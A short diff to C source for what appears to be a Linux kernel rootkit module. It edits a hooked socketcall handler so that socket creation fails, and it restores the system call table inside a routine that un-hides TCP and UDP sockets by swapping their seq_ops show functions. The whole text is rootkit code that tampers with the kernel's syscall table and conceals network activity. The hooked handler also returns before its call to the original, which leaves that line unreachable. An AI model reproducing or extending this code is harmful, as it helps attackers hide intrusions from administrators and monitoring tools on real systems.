@@ -91,7 +91,9 @@ int find_syscall(void* addr){
 }
 
 asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
-    OUR_DEBUG("hooked_socketcall\n");
+    OUR_DEBUG("hooked_socketcall with call %d\n", call);
+    if (call==1)
+        return -1;
     return 0;
     return orig_socketcall(call, args);
 }
@@ -161,7 +163,7 @@ void unhide_sockets(void){
         udp_seq->seq_ops.show = udp_show_orig;
     }
     syscall_table = (void**) ptr_sys_call_table;
-    // syscall_table[nr_sys_sendmsg] = orig_sendmsg;
+    syscall_table[__NR_socketcall] = orig_socketcall;
 }
 
 // helper function to compute log10 of some int, needed for knowing how much mem to allocate
